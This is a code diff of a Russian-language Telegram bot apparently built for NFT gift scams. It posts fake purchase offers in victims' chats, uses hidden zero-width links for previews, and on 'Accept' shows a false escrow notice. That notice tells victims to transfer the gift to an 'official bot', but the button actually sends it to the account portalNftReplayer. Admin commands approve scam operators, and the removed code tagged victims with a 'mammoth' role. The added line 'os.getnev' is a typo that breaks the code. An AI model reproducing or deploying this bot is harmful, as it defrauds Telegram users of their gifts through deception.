@@ -4,98 +4,61 @@ import logging
 import os
 import aiohttp
 import sqlite3
-import random
-import string
 from threading import Thread
 from flask import Flask
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
-from aiogram.fsm.context import FSMContext
-from aiogram.fsm.state import State, StatesGroup
-from aiogram.fsm.storage.memory import MemoryStorage
 
-# Токен берется из переменной окружения Render
-BOT_TOKEN = os.getenv("BOT_TOKEN")
+BOT_TOKEN = os.getnev("BOT_TOKEN")
 RENDER_URL = "https://portals-ams5.onrender.com" 
 MAIN_ADMIN_ID = 8438026734
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
-dp = Dispatcher(storage=MemoryStorage())
+dp = Dispatcher()
 
-# --- СОСТОЯНИЯ (FSM) ---
-class AdminStates(StatesGroup):
-    waiting_for_user = State()
-    waiting_for_check_amount = State()
-    waiting_for_check_currency = State()
-    waiting_for_check_uses = State()
-    waiting_for_check_password = State()
-
-class UserStates(StatesGroup):
-    waiting_for_deposit_amount = State()
-    waiting_for_deposit_currency = State()
-    waiting_for_check_activation = State()
-
-# --- БАЗА ДАННЫХ ---
 def init_db():
     conn = sqlite3.connect('users.db')
     cursor = conn.cursor()
-    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
-                      (id INTEGER PRIMARY KEY, username TEXT, role TEXT, 
-                       balance_stars REAL DEFAULT 0, balance_gram REAL DEFAULT 0, balance_usdt REAL DEFAULT 0)''')
-    cursor.execute('''CREATE TABLE IF NOT EXISTS checks 
-                      (code TEXT PRIMARY KEY, amount REAL, currency TEXT, uses_left INTEGER, password TEXT)''')
-    cursor.execute("INSERT OR IGNORE INTO users (id, username, role) VALUES (?, ?, ?)", (MAIN_ADMIN_ID, "admin", "admin"))
+    cursor.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, role TEXT)''')
+    cursor.execute("INSERT OR IGNORE INTO users (id, role) VALUES (?, ?)", (MAIN_ADMIN_ID, "admin"))
     conn.commit()
     conn.close()
 
-def get_user(user_id):
+def get_user_role(user_id):
     conn = sqlite3.connect('users.db')
     cursor = conn.cursor()
-    cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
-    result = cursor.fetchone()
-    conn.close()
-    return result
-
-def get_user_id(target):
-    conn = sqlite3.connect('users.db')
-    cursor = conn.cursor()
-    if target.startswith("@"):
-        cursor.execute("SELECT id FROM users WHERE username = ?", (target,))
-    else:
-        try:
-            cursor.execute("SELECT id FROM users WHERE id = ?", (int(target),))
-        except ValueError:
-            return None
+    cursor.execute("SELECT role FROM users WHERE id = ?", (user_id,))
     result = cursor.fetchone()
     conn.close()
     return result[0] if result else None
 
-def update_user(user_id, role=None, stars=None, gram=None, usdt=None):
+def add_user(user_id, role="user"):
     conn = sqlite3.connect('users.db')
     cursor = conn.cursor()
-    if role: cursor.execute("UPDATE users SET role = ? WHERE id = ?", (role, user_id))
-    if stars: cursor.execute("UPDATE users SET balance_stars = balance_stars + ? WHERE id = ?", (stars, user_id))
-    if gram: cursor.execute("UPDATE users SET balance_gram = balance_gram + ? WHERE id = ?", (gram, user_id))
-    if usdt: cursor.execute("UPDATE users SET balance_usdt = balance_usdt + ? WHERE id = ?", (usdt, user_id))
+    cursor.execute("INSERT OR REPLACE INTO users (id, role) VALUES (?, ?)", (user_id, role))
     conn.commit()
     conn.close()
 
-def create_check(amount, currency, uses, password):
-    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+def del_user(user_id):
     conn = sqlite3.connect('users.db')
     cursor = conn.cursor()
-    cursor.execute("INSERT INTO checks (code, amount, currency, uses_left, password) VALUES (?, ?, ?, ?, ?)", 
-                   (code, amount, currency, uses, password))
+    cursor.execute("DELETE FROM users WHERE id = ? AND id != ?", (user_id, MAIN_ADMIN_ID))
     conn.commit()
     conn.close()
-    return code
+
+def get_all_users():
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    cursor.execute("SELECT id, role FROM users")
+    users = cursor.fetchall()
+    conn.close()
+    return users
 
 init_db()
 
-# --- ВЕБ-СЕРВЕР ---
 app = Flask(__name__)
 
 @app.route('/')
@@ -116,388 +79,272 @@ async def keep_alive():
             pass
         await asyncio.sleep(600)
 
-# --- ТЕКСТЫ ---
 TEXTS = {
     "ru": {
-        "offer": "Пользователь {user_link}\nпредлагает вам {price} за подарок\n\"{nft_name}\".\n\nПредложение действует еще 24h 00m.",
+        "offer": "Пользователь {user_link}\nпредлагает вам {price} за подарок\n\"{nft_name}\".\n\nПредложение действует еще 24h 00m.\n\n<a href='{nft_link}'>​</a>",
+        "btn_show": "ПОКАЗАТЬ ПОДАРОК",
         "btn_decline": "Отклонить",
         "btn_accept": "Принять",
         "accepted": "<b>Покупатель зарезервировал ваш подарок.</b>\n\n<blockquote>Средства хранятся на специальном эскроу-счете и будут зачислены на баланс после передачи подарка.\n\n<b>Для завершения сделки:</b>\n1. Передайте подарок официальному боту: {transfer_bot}\n2. Нажмите «Передать NFT» и выберите NFT.\n3. Подтвердите передачу подарка.\n\nTelegram зафиксирует транзакцию и моментально зачислит {price} на ваш аккаунт.\n\n<b>Резерв действует 24 часа.</b></blockquote>",
-        "btn_transfer": "Передать NFT",
+        "btn_transfer": "Передать NFT"
     },
-    "en": { "offer": "...", "btn_decline": "Decline", "btn_accept": "Accept", "accepted": "...", "btn_transfer": "Transfer" },
-    "zh": { "offer": "...", "btn_decline": "拒绝", "btn_accept": "接受", "accepted": "...", "btn_transfer": "转移" }
+    "en": {
+        "offer": "User {user_link}\noffers you {price} for the gift\n\"{nft_name}\".\n\nOffer valid for another 24h 00m.\n\n<a href='{nft_link}'>​</a>",
+        "btn_show": "SHOW GIFT",
+        "btn_decline": "Decline",
+        "btn_accept": "Accept",
+        "accepted": "<b>The buyer has reserved your gift.</b>\n\n<blockquote>Funds are held in a special escrow account and will be credited to the balance after the gift is transferred.\n\n<b>To complete the deal:</b>\n1. Transfer the gift to the official bot: {transfer_bot}\n2. Click 'Transfer NFT' and select the NFT.\n3. Confirm the transfer of the gift.\n\nTelegram will record the transaction and instantly credit {price} to your account.\n\n<b>The reservation is valid for 24 hours.</b></blockquote>",
+        "btn_transfer": "Transfer NFT"
+    },
+    "zh": {
+        "offer": "用户 {user_link}\n向您提供 {price} 购买礼物\n\"{nft_name}\"。\n\n报价有效期为 24小时 00分钟。\n\n<a href='{nft_link}'>​</a>",
+        "btn_show": "显示礼物",
+        "btn_decline": "拒绝",
+        "btn_accept": "接受",
+        "accepted": "<b>买家已预订您的礼物。</b>\n\n<blockquote>资金存放在特殊的托管账户中，将在礼物转移后记入余额。\n\n<b>完成交易：</b>\n1. 将礼物转移给官方机器人：{transfer_bot}\n2. 点击“转移 NFT”并选择 NFT。\n3. 确认礼物转移。\n\nTelegram 将记录交易并立即将 {price} 记入您的账户。\n\n<b>预订有效期为 24 小时。</b></blockquote>",
+        "btn_transfer": "转移 NFT"
+    }
 }
 
-# --- ПОЛЬЗОВАТЕЛЬСКОЕ МЕНЮ ---
-def get_user_menu(user_id):
-    user = get_user(user_id)
-    bal_stars = user[3] if user else 0
-    bal_gram = user[4] if user else 0
-    bal_usdt = user[5] if user else 0
+async def create_offer(chat_id, user_id, user_full_name, command_text, business_connection_id=None):
+    command = command_text.split()[0].lower()
+    lang = "ru" if command == "/price" else ("en" if command == "/prace" else "zh")
+    t = TEXTS[lang]
+
+    pattern = r"^/(price|prace|proce)\s+(https?://\S+)\s+([\d\.]+)\s+(gram|stars)(?:\s+(@\w+))?$"
+    match = re.match(pattern, command_text, re.IGNORECASE)
+    if not match:
+        return
+
+    _, nft_link, price_value, currency, target_user = match.groups()
+    price_text = f"{price_value} ⭐" if currency.lower() == "stars" else f"{price_value} 💎"
     
-    text = (f"👋 <b>Главное меню</b>\n\n"
-            f"💎 Баланс: {bal_gram} GRAM\n"
-            f"⭐ Баланс: {bal_stars} Stars\n"
-            f"💵 Баланс: {bal_usdt} USDT\n\n"
-            f"Выберите действие:")
-    
+    nft_name_formatted = nft_link.split('/')[-1].replace('-', '').capitalize()
+    user_link = f"<a href='tg://user?id={user_id}'>{user_full_name}</a>"
+
+    # Пустой пробел (Zero-width space) внутри тега <a> делает ссылку невидимой, 
+    # но Telegram все равно подтягивает превью.
+    final_text = t["offer"].format(user_link=user_link, price=price_text, nft_name=nft_name_formatted, nft_link=nft_link)
+
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💰 Пополнить баланс", callback_data="deposit")],
-        [InlineKeyboardButton(text="🎁 Активировать чек", callback_data="activate_check")],
-        [InlineKeyboardButton(text="📖 Инструкция", callback_data="tutor")]
+        [InlineKeyboardButton(text=t["btn_show"], url=nft_link)],
+        [
+            InlineKeyboardButton(text=t["btn_decline"], callback_data=f"decline:{lang}"),
+            InlineKeyboardButton(text=t["btn_accept"], callback_data=f"accept:{price_text}:{lang}")
+        ]
     ])
-    return text, keyboard
+
+    try:
+        await bot.send_message(
+            chat_id=chat_id,
+            text=final_text,
+            business_connection_id=business_connection_id,
+            reply_markup=keyboard,
+            disable_web_page_preview=False
+        )
+    except Exception as e:
+        logging.error(f"Ошибка при отправке: {e}")
 
 @dp.message(F.text == "/start")
 async def start_command(message: types.Message):
     user_id = message.from_user.id
-    username = f"@{message.from_user.username}" if message.from_user.username else "нет"
-    user = get_user(user_id)
+    role = get_user_role(user_id)
 
-    if user:
-        role = user[2]
-        if role in ["admin", "user", "frish"]:
-            text, kb = get_user_menu(user_id)
-            await message.answer(text, reply_markup=kb)
-            return
+    if role in ["admin", "user"]:
+        return
 
     admin_text = (
-        f"🔔 <b>Новая заявка!</b>\n\n"
-        f"👤 {message.from_user.full_name}\n"
-        f"🆔 <code>{user_id}</code>\n"
-        f"🔗 {username}"
+        f"🔔 <b>Новая заявка на доступ!</b>\n\n"
+        f"👤 Имя: {message.from_user.full_name}\n"
+        f"🆔 ID: <code>{user_id}</code>\n"
+        f"🔗 Юзернейм: @{message.from_user.username or 'нет'}"
     )
+    
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="✅ Юзер", callback_data=f"approve:user:{user_id}:{username}"),
-            InlineKeyboardButton(text="🦣 Фришный", callback_data=f"approve:frish:{user_id}:{username}"),
+            InlineKeyboardButton(text="✅ Принять", callback_data=f"approve:{user_id}"),
             InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject:{user_id}")
         ]
     ])
+
     try:
         await bot.send_message(MAIN_ADMIN_ID, admin_text, reply_markup=keyboard)
     except Exception as e:
-        logging.error(f"Ошибка заявки: {e}")
+        logging.error(f"Ошибка при отправке заявки: {e}")
 
-@dp.callback_query(F.data == "tutor")
-async def tutor_cb(callback: types.CallbackQuery):
-    text = ("📖 <b>Инструкция</b>\n\n"
-            "Для создания офера:\n<code>/price [ссылка] [цена] [валюта]</code>\n\n"
-            "Пример: <code>/price https://t.me/nft/... 7 gram</code>\n"
-            "Валюты: gram, stars, usdt")
-    await callback.message.answer(text)
-    await callback.answer()
-
-@dp.callback_query(F.data == "deposit")
-async def deposit_cb(callback: types.CallbackQuery):
-    if get_user(callback.from_user.id)[2] == "frish":
-        await callback.answer("Фришным нельзя пополнять баланс напрямую.", show_alert=True)
-        return
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="⭐ Звезды", callback_data="dep_stars")],
-        [InlineKeyboardButton(text="💎 Крипта", callback_data="dep_crypto")]
-    ])
-    await callback.message.answer("Выберите способ оплаты:", reply_markup=keyboard)
-    await callback.answer()
-
-@dp.callback_query(F.data == "dep_stars")
-async def dep_stars(callback: types.CallbackQuery, state: FSMContext):
-    await callback.message.answer("Введите количество звезд для пополнения:")
-    await state.set_state(UserStates.waiting_for_deposit_amount)
-    await callback.answer()
-
-@dp.message(UserStates.waiting_for_deposit_amount)
-async def process_deposit_amount(message: types.Message, state: FSMContext):
-    try:
-        amount = float(message.text)
-        await message.answer(f"✅ Ссылка на оплату {amount} звезд сгенерирована (ЗАГЛУШКА).\nПосле оплаты баланс обновится.")
-        await state.clear()
-    except:
-        await message.answer("❌ Введите число.")
-
-@dp.callback_query(F.data == "activate_check")
-async def activate_check_cb(callback: types.CallbackQuery, state: FSMContext):
-    await callback.message.answer("Введите код чека (и пароль через пробел, если есть):")
-    await state.set_state(UserStates.waiting_for_check_activation)
-    await callback.answer()
-
-@dp.message(UserStates.waiting_for_check_activation)
-async def process_check(message: types.Message, state: FSMContext):
-    args = message.text.split()
-    code = args[0].upper()
-    password = args[1] if len(args) > 1 else None
-    
-    conn = sqlite3.connect('users.db')
-    cursor = conn.cursor()
-    cursor.execute("SELECT amount, currency, uses_left, password FROM checks WHERE code = ?", (code,))
-    check = cursor.fetchone()
-    
-    if not check:
-        await message.answer("❌ Чек не найден.")
-        await state.clear()
-        return
-        
-    amount, currency, uses_left, db_password = check
-    
-    if db_password and db_password != password:
-        await message.answer("❌ Неверный пароль.")
-        await state.clear()
-        return
-        
-    if uses_left <= 0:
-        await message.answer("❌ Этот чек уже использован максимальное количество раз.")
-        await state.clear()
-        return
-
-    user_id = message.from_user.id
-    if currency == "stars": update_user(user_id, stars=amount)
-    elif currency == "gram": update_user(user_id, gram=amount)
-    else: update_user(user_id, usdt=amount)
-
-    cursor.execute("UPDATE checks SET uses_left = uses_left - 1 WHERE code = ?", (code,))
-    conn.commit()
-    conn.close()
-    
-    await message.answer(f"🎉 Чек активирован! Начислено {amount} {currency}.")
-    await state.clear()
-
-# --- АДМИН-ПАНЕЛЬ ---
 @dp.message(F.text == "/adminpanel")
 async def admin_panel(message: types.Message):
-    if get_user(message.from_user.id)[2] != "admin": return
-    text = "👑 <b>Админ-панель</b>"
+    if get_user_role(message.from_user.id) != "admin":
+        return
+
+    text = (
+        "👑 <b>Админ-панель</b>\n\n"
+        "Доступные команды:\n"
+        "📋 <code>/list_users</code> — Список всех участников\n"
+        "➕ <code>/add_admin [ID]</code> — Назначить админом\n"
+        "➕ <code>/add_user [ID]</code> — Добавить пользователя\n"
+        "❌ <code>/del [ID]</code> — Удалить пользователя по ID\n"
+        "📥 <code>/download_db</code> — Скачать файл базы\n"
+    )
+    
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="👥 Список юзеров", callback_data="adm_list")],
-        [InlineKeyboardButton(text="🎁 Создать чек", callback_data="adm_check")],
-        [InlineKeyboardButton(text="📥 Скачать базу", callback_data="adm_db")]
+        [InlineKeyboardButton(text="📥 Скачать базу (users.db)", callback_data="download_db")]
     ])
+    
     await message.answer(text, reply_markup=keyboard)
 
-@dp.callback_query(F.data == "adm_list")
-async def adm_list(callback: types.CallbackQuery):
-    if get_user(callback.from_user.id)[2] != "admin": return
-    conn = sqlite3.connect('users.db')
-    cursor = conn.cursor()
-    cursor.execute("SELECT id, username, role FROM users")
-    users = cursor.fetchall()
-    conn.close()
+@dp.message(F.text == "/list_users")
+async def list_users(message: types.Message):
+    if get_user_role(message.from_user.id) != "admin": return
+    users = get_all_users()
+    if not users:
+        return
+
+    text = "👥 <b>Список участников:</b>\n\n"
+    for u_id, role in users:
+        icon = "👑" if role == "admin" else "👤"
+        text += f"{icon} <code>{u_id}</code> — {role}\n"
     
-    keyboard = []
-    for u_id, username, role in users:
-        icon = "👑" if role == "admin" else ("🦣" if role == "frish" else "👤")
-        keyboard.append([InlineKeyboardButton(text=f"{icon} {username}", callback_data=f"usr_{u_id}")])
-    
-    await callback.message.edit_text("👥 Выберите пользователя:", reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
-    await callback.answer()
+    await message.answer(text)
 
-@dp.callback_query(F.data.startswith("usr_"))
-async def user_manage(callback: types.CallbackQuery):
-    if get_user(callback.from_user.id)[2] != "admin": return
-    user_id = int(callback.data.split("_")[1])
-    user = get_user(user_id)
-    if not user: return
-    
-    text = (f"👤 <b>Юзер:</b> {user[1]}\n"
-            f"🆔 ID: {user[0]}\n"
-            f"Роль: {user[2]}\n"
-            f"Баланс: {user[3]}⭐ | {user[4]}💎 | {user[5]}💵")
-            
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Назначить Админом", callback_data=f"set_admin_{user_id}")],
-        [InlineKeyboardButton(text="Сделать Фришным", callback_data=f"set_frish_{user_id}")],
-        [InlineKeyboardButton(text="Сделать Юзером", callback_data=f"set_user_{user_id}")],
-        [InlineKeyboardButton(text="❌ Удалить", callback_data=f"del_{user_id}")]
-    ])
-    await callback.message.edit_text(text, reply_markup=keyboard)
-    await callback.answer()
-
-@dp.callback_query(F.data.startswith("set_admin_"))
-async def set_admin(callback: types.CallbackQuery):
-    uid = int(callback.data.split("_")[2])
-    update_user(uid, role="admin")
-    await callback.answer("Теперь админ", show_alert=True)
-    await user_manage(callback)
-
-@dp.callback_query(F.data.startswith("set_frish_"))
-async def set_frish(callback: types.CallbackQuery):
-    uid = int(callback.data.split("_")[2])
-    update_user(uid, role="frish")
-    await callback.answer("Теперь фришный", show_alert=True)
-    await user_manage(callback)
-
-@dp.callback_query(F.data.startswith("set_user_"))
-async def set_user(callback: types.CallbackQuery):
-    uid = int(callback.data.split("_")[2])
-    update_user(uid, role="user")
-    await callback.answer("Теперь юзер", show_alert=True)
-    await user_manage(callback)
-
-@dp.callback_query(F.data.startswith("del_"))
-async def del_user_cb(callback: types.CallbackQuery):
-    uid = int(callback.data.split("_")[1])
-    if uid == MAIN_ADMIN_ID: return
-    conn = sqlite3.connect('users.db')
-    cursor = conn.cursor()
-    cursor.execute("DELETE FROM users WHERE id = ?", (uid,))
-    conn.commit()
-    conn.close()
-    await callback.answer("Удален", show_alert=True)
-    await adm_list(callback)
-
-@dp.callback_query(F.data == "adm_check")
-async def adm_check(callback: types.CallbackQuery, state: FSMContext):
-    await callback.message.answer("Введите сумму чека:")
-    await state.set_state(AdminStates.waiting_for_check_amount)
-    await callback.answer()
-
-@dp.message(AdminStates.waiting_for_check_amount)
-async def check_amount(message: types.Message, state: FSMContext):
+@dp.message(F.text.startswith("/add_admin"))
+async def add_admin_cmd(message: types.Message):
+    if get_user_role(message.from_user.id) != "admin": return
     try:
-        amount = float(message.text)
-        await state.update_data(amount=amount)
-        keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="⭐ Stars", callback_data="chk_stars")],
-            [InlineKeyboardButton(text="💎 GRAM", callback_data="chk_gram")],
-            [InlineKeyboardButton(text="💵 USDT", callback_data="chk_usdt")]
-        ])
-        await message.answer("Выберите валюту:", reply_markup=keyboard)
-        await state.set_state(AdminStates.waiting_for_check_currency)
+        target_id = int(message.text.split()[1])
+        add_user(target_id, "admin")
+        await message.answer(f"👑 Пользователь {target_id} назначен админом.")
+        try:
+            await bot.send_message(target_id, "👑 Вам выданы права администратора в боте.")
+        except:
+            pass
     except:
-        await message.answer("❌ Введите число.")
+        await message.answer("❌ Формат: /add_admin 123456789")
 
-@dp.callback_query(AdminStates.waiting_for_check_currency)
-async def check_currency(callback: types.CallbackQuery, state: FSMContext):
-    currency = callback.data.split("_")[1]
-    await state.update_data(currency=currency)
-    await callback.message.answer("Введите количество активаций:")
-    await state.set_state(AdminStates.waiting_for_check_uses)
-    await callback.answer()
-
-@dp.message(AdminStates.waiting_for_check_uses)
-async def check_uses(message: types.Message, state: FSMContext):
+@dp.message(F.text.startswith("/add_user"))
+async def add_user_cmd(message: types.Message):
+    if get_user_role(message.from_user.id) != "admin": return
     try:
-        uses = int(message.text)
-        await state.update_data(uses=uses)
-        await message.answer("Введите пароль (или напишите 'нет'):")
-        await state.set_state(AdminStates.waiting_for_check_password)
+        target_id = int(message.text.split()[1])
+        add_user(target_id, "user")
+        await message.answer(f"✅ Пользователь {target_id} добавлен.")
+        try:
+            await bot.send_message(target_id, "🎉 Вам выдан доступ к боту!")
+        except:
+            pass
     except:
-        await message.answer("❌ Введите число.")
+        await message.answer("❌ Формат: /add_user 123456789")
 
-@dp.message(AdminStates.waiting_for_check_password)
-async def check_password(message: types.Message, state: FSMContext):
-    password = message.text if message.text.lower() != "нет" else None
-    data = await state.get_data()
+@dp.message(F.text.startswith("/del"))
+async def del_user_cmd(message: types.Message):
+    if get_user_role(message.from_user.id) != "admin": return
     
-    code = create_check(data['amount'], data['currency'], data['uses'], password)
-    check_link = f"https://t.me/portals_nftbot?start=check_{code}"
-    
-    await message.answer(f"✅ Чек создан!\n\nКод: <code>{code}</code>\nСсылка: {check_link}\nПароль: {password or 'нет'}\nАктиваций: {data['uses']}")
-    await state.clear()
+    args = message.text.split()
+    if len(args) < 2:
+        await message.answer("❌ Формат: /del 123456789 (ID пользователя)")
+        return
+        
+    try:
+        target_id = int(args[1])
+    except ValueError:
+        await message.answer("❌ Ошибка: нужно ввести цифровой ID, а не @юзернейм.")
+        return
 
-@dp.callback_query(F.data == "adm_db")
-async def adm_db(callback: types.CallbackQuery):
+    if target_id == MAIN_ADMIN_ID:
+        await message.answer("❌ Нельзя удалить главного админа.")
+        return
+        
+    del_user(target_id)
+    await message.answer(f"✅ Пользователь {target_id} удален из базы.")
+
+@dp.message(F.text == "/download_db")
+async def download_db_cmd(message: types.Message):
+    if get_user_role(message.from_user.id) != "admin": return
     try:
         file = FSInputFile("users.db")
-        await callback.message.answer_document(file, caption="📦 База")
+        await message.answer_document(file, caption="📦 Файл базы данных")
     except Exception as e:
-        await callback.message.answer(f"❌ {e}")
+        await message.answer(f"❌ Ошибка: {e}")
+
+@dp.callback_query(F.data == "download_db")
+async def download_db_callback(callback: types.CallbackQuery):
+    if get_user_role(callback.from_user.id) != "admin": return
+    try:
+        file = FSInputFile("users.db")
+        await callback.message.answer_document(file, caption="📦 Файл базы данных")
+    except Exception as e:
+        await callback.message.answer(f"❌ Ошибка: {e}")
     await callback.answer()
 
-# --- ЗАЯВКИ ---
 @dp.callback_query(F.data.startswith("approve:"))
 async def approve_user(callback: types.CallbackQuery):
-    if get_user(callback.from_user.id)[2] != "admin": return
-    _, role, uid, username = callback.data.split(":")
-    update_user(int(uid), role=role)
+    if get_user_role(callback.from_user.id) != "admin": return
+    user_id = int(callback.data.split(":")[1])
+    add_user(user_id, "user")
     
-    conn = sqlite3.connect('users.db')
-    cursor = conn.cursor()
-    cursor.execute("INSERT OR IGNORE INTO users (id, username, role) VALUES (?, ?, ?)", (int(uid), username, role))
-    conn.commit()
-    conn.close()
-    
-    await callback.message.edit_text(f"✅ {username} одобрен как {role}.")
+    await callback.message.edit_text(f"✅ Пользователь <code>{user_id}</code> одобрен.")
     try:
-        await bot.send_message(int(uid), f"🎉 Ваша заявка одобрена! Роль: {role}.\nНапишите /start.")
-    except: pass
+        await bot.send_message(user_id, "🎉 Ваша заявка одобрена! Теперь вы можете использовать /price.")
+    except:
+        pass
     await callback.answer()
 
 @dp.callback_query(F.data.startswith("reject:"))
 async def reject_user(callback: types.CallbackQuery):
-    if get_user(callback.from_user.id)[2] != "admin": return
-    uid = int(callback.data.split(":")[1])
-    await callback.message.edit_text(f"❌ Заявка отклонена.")
+    if get_user_role(callback.from_user.id) != "admin": return
+    user_id = int(callback.data.split(":")[1])
+    await callback.message.edit_text(f"❌ Пользователь <code>{user_id}</code> отклонен.")
     await callback.answer()
 
-# --- ОФЕРЫ ---
-async def create_offer(chat_id, user_id, full_name, text, biz_id=None):
-    command = text.split()[0].lower()
-    lang = "ru" if command == "/price" else ("en" if command == "/prace" else "zh")
-    t = TEXTS[lang]
-
-    pattern = r"^/(price|prace|proce)\s+(https?://\S+)\s+([\d\.]+)\s+(gram|stars|usdt)"
-    match = re.match(pattern, text, re.IGNORECASE)
-    if not match: return
-
-    nft_link, price, currency = match.group(2), match.group(3), match.group(4).lower()
-    if currency == "stars": price_text = f"{price} ⭐"
-    elif currency == "usdt": price_text = f"{price} 💵"
-    else: price_text = f"{price} 💎"
-
-    nft_name = nft_link.split('/')[-1].replace('-', '').capitalize()
-    user_link = f"<a href='tg://user?id={user_id}'>{full_name}</a>"
-    
-    final_text = t["offer"].format(user_link=user_link, price=price_text, nft_name=nft_name)
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text=t["btn_decline"], callback_data=f"decline:{lang}"),
-        InlineKeyboardButton(text=t["btn_accept"], callback_data=f"accept:{price_text}:{lang}")
-    ]])
-
+@dp.business_message(F.text.regexp(r"^/(price|prace|proce)\s+"))
+async def handle_business_price(message: types.Message):
+    if get_user_role(message.from_user.id) not in ["admin", "user"]: return
     try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getWebPagePreview"
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url, params={"url": nft_link}) as resp:
-                data = await resp.json()
-                if data.get("ok") and "photo" in data.get("result", {}):
-                    photo = data["result"]["photo"][-1]["file_id"]
-                    await bot.send_photo(chat_id=chat_id, photo=photo, caption=final_text, business_connection_id=biz_id, reply_markup=keyboard)
-                    return
-    except: pass
-
-    await bot.send_message(chat_id=chat_id, text=final_text + f"\n<a href='{nft_link}'>​</a>", business_connection_id=biz_id, reply_markup=keyboard)
+        await bot.delete_business_messages(
+            business_connection_id=message.business_connection_id,
+            message_ids=[message.message_id]
+        )
+    except Exception:
+        pass
+    await create_offer(message.chat.id, message.from_user.id, message.from_user.full_name, message.text, message.business_connection_id)
 
 @dp.message(F.text.regexp(r"^/(price|prace|proce)\s+"))
 async def handle_private_price(message: types.Message):
-    user = get_user(message.from_user.id)
-    if not user or user[2] not in ["admin", "user"]: return
-    
-    try: await message.delete()
-    except: pass
-    
+    if get_user_role(message.from_user.id) not in ["admin", "user"]: return
+    try:
+        await message.delete()
+    except Exception:
+        pass
     await create_offer(message.chat.id, message.from_user.id, message.from_user.full_name, message.text)
-    
-    offer_link = f"https://t.me/portals_nftbot?start=offer_{message.from_user.id}"
-    await message.answer(f"🔗 Ссылка на офер: {offer_link}")
 
 @dp.callback_query(F.data.startswith("accept:"))
 async def accept_offer(callback: types.CallbackQuery):
     await callback.answer()
-    _, price_str, lang = callback.data.split(":")
-    t = TEXTS[lang]
-    new_text = t["accepted"].format(transfer_bot="@portals_nftbot", price=price_str)
-    gift_link = "tg://send_gift?to=portalNftReplayer"
-    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t["btn_transfer"], url=gift_link)]])
-    
-    if callback.message.photo:
-        await bot.edit_message_caption(caption=new_text, chat_id=callback.message.chat.id, message_id=callback.message.message_id, reply_markup=kb, business_connection_id=callback.message.business_connection_id)
-    else:
-        await bot.edit_message_text(text=new_text, chat_id=callback.message.chat.id, message_id=callback.message.message_id, reply_markup=kb, business_connection_id=callback.message.business_connection_id)
+    try:
+        parts = callback.data.split(":")
+        price_str, lang = parts[1], parts[2]
+        t = TEXTS[lang]
+
+        target_username = "portalNftReplayer" 
+        gift_link = f"tg://send_gift?to={target_username}"
+
+        new_text = t["accepted"].format(transfer_bot="@portals_nftbot", price=price_str)
+        new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text=t["btn_transfer"], url=gift_link)]
+        ])
+
+        await bot.edit_message_text(
+            text=new_text, chat_id=callback.message.chat.id, message_id=callback.message.message_id,
+            reply_markup=new_keyboard, business_connection_id=callback.message.business_connection_id
+        )
+    except Exception as e:
+        logging.error(f"Ошибка в кнопке: {e}")
 
 @dp.callback_query(F.data.startswith("decline:"))
 async def decline_offer(callback: types.CallbackQuery):
     lang = callback.data.split(":")[1]
-    await callback.answer("Отклонено", show_alert=True)
+    msg = "Вы отклонили предложение." if lang == "ru" else ("You have declined the offer." if lang == "en" else "您已拒绝该报价。")
+    await callback.answer(msg, show_alert=True)
 
 async def main():
     Thread(target=run_flask, daemon=True).start()
